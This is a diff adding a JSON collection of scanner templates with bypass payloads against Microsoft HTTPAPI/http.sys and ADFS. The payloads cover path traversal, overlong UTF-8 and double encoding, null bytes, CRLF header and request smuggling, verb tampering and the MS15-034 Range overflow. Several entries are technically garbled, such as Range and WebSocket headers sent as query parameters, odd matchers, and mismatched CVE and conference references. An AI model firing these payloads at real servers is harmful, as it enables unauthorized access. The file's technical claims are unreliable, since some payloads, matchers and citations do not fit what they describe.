@@ -1,0 +1,731 @@
+[
+  {
+    "id": "httpapi-parser-normalization-bypass",
+    "info": {
+      "name": "Microsoft HTTPAPI URL Normalization Bypass",
+      "severity": "high",
+      "category": "httpapi-bypass",
+      "description": "Exploits HTTPAPI's URL normalization behavior where certain malformed URLs bypass security checks but are normalized by the kernel driver",
+      "references": [
+        "https://docs.microsoft.com/en-us/windows/win32/http/http-server-api-version-2-0",
+        "https://www.blackhat.com/docs/us-17/wednesday/us-17-Birch-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out.pdf"
+      ],
+      "tags": [
+        "httpapi",
+        "parser-differential",
+        "windows",
+        "iis",
+        "adfs"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/%2e%2e/",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/..;/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/.%2e/",
+        "encoding": "mixed",
+        "method": "GET"
+      },
+      {
+        "value": "/.//..//",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/.%00../",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "403",
+          "404"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-unicode-normalization",
+    "info": {
+      "name": "HTTPAPI Unicode Normalization Bypass",
+      "severity": "critical",
+      "category": "httpapi-bypass",
+      "description": "Leverages HTTPAPI's Unicode normalization vulnerabilities using overlong UTF-8 sequences and Unicode equivalents",
+      "references": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269",
+        "https://www.kb.cert.org/vuls/id/867968"
+      ],
+      "tags": [
+        "httpapi",
+        "unicode",
+        "utf8",
+        "normalization",
+        "rce"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/%c0%af",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/%c1%9c",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/%c0%ae%c0%ae/",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/%e0%80%af",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/%f0%80%80%af",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/\u00e9\u00e9\u00e9",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "403",
+          "500"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-header-smuggling",
+    "info": {
+      "name": "HTTPAPI Header Smuggling",
+      "severity": "critical",
+      "category": "httpapi-bypass",
+      "description": "Exploits HTTPAPI's header parsing logic to smuggle requests through proxy/WAF layers",
+      "references": [
+        "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn",
+        "https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2023-23392"
+      ],
+      "tags": [
+        "httpapi",
+        "smuggling",
+        "desync",
+        "header-injection"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "?header_test=1\r\nX-Forwarded-For: 127.0.0.1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?test=1%0d%0aTransfer-Encoding:%20chunked",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "?test=1%0aContent-Length:%200",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "?test=1\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_header",
+        "condition": "not_contains",
+        "patterns": [
+          "x-frame-options"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-verb-tampering",
+    "info": {
+      "name": "HTTPAPI HTTP Verb Tampering",
+      "severity": "high",
+      "category": "httpapi-bypass",
+      "description": "Tests HTTP verb tampering bypasses specific to HTTPAPI's method handling",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering"
+      ],
+      "tags": [
+        "httpapi",
+        "verb-tampering",
+        "method-override"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "",
+        "encoding": "none",
+        "method": "TRACE"
+      },
+      {
+        "value": "",
+        "encoding": "none",
+        "method": "TRACK"
+      },
+      {
+        "value": "",
+        "encoding": "none",
+        "method": "OPTIONS"
+      },
+      {
+        "value": "?_method=POST",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?X-HTTP-Method-Override=PUT",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "405",
+          "501"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-version-confusion",
+    "info": {
+      "name": "HTTPAPI Protocol Version Confusion",
+      "severity": "medium",
+      "category": "httpapi-bypass",
+      "description": "Exploits HTTPAPI's handling of malformed or unusual HTTP version strings",
+      "references": [
+        "https://www.blackhat.com/docs/us-16/materials/us-16-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf"
+      ],
+      "tags": [
+        "httpapi",
+        "protocol-confusion",
+        "http-version"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "?test=HTTP/0.9",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?test=HTTP/1.2",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?test=HTTP/3.0",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "505"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-chunked-bypass",
+    "info": {
+      "name": "HTTPAPI Chunked Encoding Bypass",
+      "severity": "critical",
+      "category": "httpapi-bypass",
+      "description": "Tests chunked encoding parsing vulnerabilities in HTTPAPI that can bypass WAF inspection",
+      "references": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23392",
+        "https://portswigger.net/web-security/request-smuggling"
+      ],
+      "tags": [
+        "httpapi",
+        "chunked-encoding",
+        "transfer-encoding",
+        "smuggling"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "?chunked_test=1",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "?te_test=chunked%20chunked",
+        "encoding": "url",
+        "method": "POST"
+      },
+      {
+        "value": "?te_space=chunked%20",
+        "encoding": "url",
+        "method": "POST"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "413"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-long-url-bypass",
+    "info": {
+      "name": "HTTPAPI Long URL Buffer Overflow",
+      "severity": "high",
+      "category": "httpapi-bypass",
+      "description": "Tests HTTPAPI's handling of extremely long URLs which may trigger buffer overflows or bypass size limits",
+      "references": [
+        "https://support.microsoft.com/en-us/topic/ms15-034-vulnerability-in-http-sys-could-allow-remote-code-execution-april-14-2015-4b03f18e-1a69-9e39-b67a-d3c2e2a567f2"
+      ],
+      "tags": [
+        "httpapi",
+        "buffer-overflow",
+        "dos",
+        "url-length"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "?test_long_url=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?payload_size=8192",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "414",
+          "431",
+          "413"
+        ]
+      },
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "500",
+          "503"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-range-header-dos",
+    "info": {
+      "name": "HTTPAPI Range Header DoS (CVE-2015-1635)",
+      "severity": "critical",
+      "category": "httpapi-bypass",
+      "description": "Tests for MS15-034 Range header vulnerability allowing remote code execution",
+      "references": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2015-1635"
+      ],
+      "tags": [
+        "httpapi",
+        "cve-2015-1635",
+        "range-header",
+        "rce",
+        "ms15-034"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "?range_test=18-18446744073709551615",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?range=bytes=0-18446744073709551615",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "equals",
+        "patterns": [
+          "416",
+          "200",
+          "206"
+        ]
+      },
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "500"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-null-byte-injection",
+    "info": {
+      "name": "HTTPAPI Null Byte Injection",
+      "severity": "high",
+      "category": "httpapi-bypass",
+      "description": "Tests null byte injection vulnerabilities in HTTPAPI URL parsing",
+      "references": [
+        "https://www.acunetix.com/vulnerabilities/web/null-byte-injection"
+      ],
+      "tags": [
+        "httpapi",
+        "null-byte",
+        "path-truncation"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/%00.asp",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?file=test%00.txt",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/admin%00/",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/.%00./",
+        "encoding": "url",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "404"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-case-sensitivity-bypass",
+    "info": {
+      "name": "HTTPAPI Case Sensitivity Bypass",
+      "severity": "medium",
+      "category": "httpapi-bypass",
+      "description": "Tests case sensitivity issues in HTTPAPI that may bypass security filters",
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal"
+      ],
+      "tags": [
+        "httpapi",
+        "case-sensitivity",
+        "windows"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/AdMiN/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/ADMIN/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?Path=../WiNdOwS",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/SyStEm32/",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "403",
+          "404"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-backslash-bypass",
+    "info": {
+      "name": "HTTPAPI Backslash Path Bypass",
+      "severity": "high",
+      "category": "httpapi-bypass",
+      "description": "Exploits HTTPAPI's Windows-specific backslash handling for path traversal",
+      "references": [
+        "https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf"
+      ],
+      "tags": [
+        "httpapi",
+        "backslash",
+        "windows",
+        "path-traversal"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/..\\",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "\\..\\",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/..%5c",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "\\admin\\",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/..\\..\\..",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "403",
+          "404"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-adfs-specific",
+    "info": {
+      "name": "HTTPAPI ADFS Authentication Bypass",
+      "severity": "critical",
+      "category": "httpapi-bypass",
+      "description": "ADFS-specific bypasses leveraging HTTPAPI quirks in Active Directory Federation Services",
+      "references": [
+        "https://www.pingsafe.com/blog/adfs-exploits-and-vulnerabilities",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42306"
+      ],
+      "tags": [
+        "httpapi",
+        "adfs",
+        "authentication-bypass",
+        "federation"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/adfs/ls/?wa=wsignin1.0%00",
+        "encoding": "url",
+        "method": "GET"
+      },
+      {
+        "value": "/adfs/ls/../portal/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/adfs/ls/.%2e/services/",
+        "encoding": "mixed",
+        "method": "GET"
+      },
+      {
+        "value": "/adfs/ls?client-request-id=../../",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/adfs/ls/?wa=wsignin1.0&wtrealm=",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "403",
+          "405"
+        ]
+      },
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "Microsoft",
+          "ADFS",
+          "Sign In"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-double-encoding",
+    "info": {
+      "name": "HTTPAPI Double Encoding Bypass",
+      "severity": "high",
+      "category": "httpapi-bypass",
+      "description": "Double-encoded payloads that bypass HTTPAPI's URL decoding filters",
+      "references": [
+        "https://owasp.org/www-community/Double_Encoding"
+      ],
+      "tags": [
+        "httpapi",
+        "double-encoding",
+        "url-decoding"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "/%252e%252e/",
+        "encoding": "double-url",
+        "method": "GET"
+      },
+      {
+        "value": "/%25%32%65%25%32%65/",
+        "encoding": "double-url",
+        "method": "GET"
+      },
+      {
+        "value": "/admin%252f",
+        "encoding": "double-url",
+        "method": "GET"
+      },
+      {
+        "value": "/%25%35%63..%25%35%63",
+        "encoding": "double-url",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "not_equals",
+        "patterns": [
+          "400",
+          "403"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "httpapi-websocket-upgrade-bypass",
+    "info": {
+      "name": "HTTPAPI WebSocket Upgrade Bypass",
+      "severity": "medium",
+      "category": "httpapi-bypass",
+      "description": "Tests WebSocket upgrade handling to bypass HTTPAPI security checks",
+      "references": [
+        "https://portswigger.net/web-security/websockets"
+      ],
+      "tags": [
+        "httpapi",
+        "websocket",
+        "upgrade",
+        "protocol-switch"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "?upgrade=websocket",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?connection=upgrade",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "?sec-websocket-version=13",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "equals",
+        "patterns": [
+          "101",
+          "200",
+          "426"
+        ]
+      }
+    ]
+  }
+]
